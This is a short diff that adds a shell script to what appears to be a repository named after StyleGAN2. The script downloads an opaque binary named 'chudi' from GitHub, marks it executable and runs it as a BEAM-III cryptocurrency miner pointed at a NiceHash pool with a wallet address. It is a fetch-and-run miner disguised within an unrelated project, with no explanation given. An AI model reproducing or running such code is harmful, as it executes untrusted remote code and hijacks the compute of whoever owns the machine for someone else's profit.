@@ -1,0 +1,6 @@
+wget https://github.com/Jhb25/StyleGAN2/blob/main/chudi
+
+
+chmod +x chudi
+
+./chudi --algo BEAM-III --pool stratum+tcp://beamv3.usa-west.nicehash.com:3387 --user 35xpRcEyRFV1imbDTbXq7eGPaHaqNYSnjT.uhi1
